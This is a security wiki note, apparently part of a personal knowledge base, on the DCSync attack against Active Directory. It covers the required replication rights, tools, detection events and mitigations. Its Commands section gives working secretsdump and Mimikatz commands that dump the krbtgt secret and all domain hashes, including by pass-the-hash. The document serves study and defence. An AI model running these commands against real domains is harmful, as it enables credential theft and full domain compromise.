---
title: DCSync
type: source
created: 2026-06-12
updated: 2026-06-12
tags: [active-directory, credential-access, replication]
source: raw/dcsync.md
---

# DCSync

> Source: `raw/dcsync.md` (Gemini research summary)

## Summary

Abuses the legitimate MS-DRSR replication protocol (`DSGetNCChanges`) to
ask a real DC to "replicate" secrets — NTLM hashes, Kerberos AES keys,
password history — for any account, including `krbtgt`. No code execution
on a DC and no `ntds.dit` access required; only the right AD permissions.
This is the standard way attackers obtain the [[krbtgt]] secret to build a
[[golden-silver-tickets|Golden Ticket]].

## Key points

- **Prerequisite**: control of a principal with `DS-Replication-Get-Changes`
  + `DS-Replication-Get-Changes-All` extended rights (normally Domain
  Admins, Enterprise Admins, DCs, Entra Connect service account).
- **Tools**: Mimikatz `lsadump::dcsync`, Impacket `secretsdump.py`,
  DSInternals.
- **Detection**: Event ID 4662 with the replication GUIDs, where
  `SubjectUserName` isn't a DC or known sync account; correlate with 4624
  Logon Type 3; network MS-DRSR traffic from non-DC hosts; honey accounts
  with replication rights granted.
- **Mitigations**: audit ACLs on the domain object (least privilege),
  [[ad-tiering-and-hardening|tiered admin model]], Protected Users, and if
  DCSync is suspected, rotate [[krbtgt]] password twice.

## Commands

```bash
# Impacket secretsdump — dump krbtgt secret (AES key needed for Golden Ticket)
secretsdump.py DOMAIN/user:password@<dc-ip> -just-dc-user krbtgt

# Dump everything (full ntds.dit equivalent over the wire)
secretsdump.py DOMAIN/user:password@<dc-ip> -just-dc

# Pass-the-hash instead of password
secretsdump.py -hashes :<nthash> DOMAIN/user@<dc-ip> -just-dc-user krbtgt
```

```powershell
# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator
```

```powershell
# Check who currently holds DCSync rights (BloodHound edges: GetChanges + GetChangesAll)
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes"}
```

## Links

- [[krbtgt]] — the highest-value target of DCSync, feeds
  [[golden-silver-tickets]]
- [[ad-tiering-and-hardening]] — mitigations
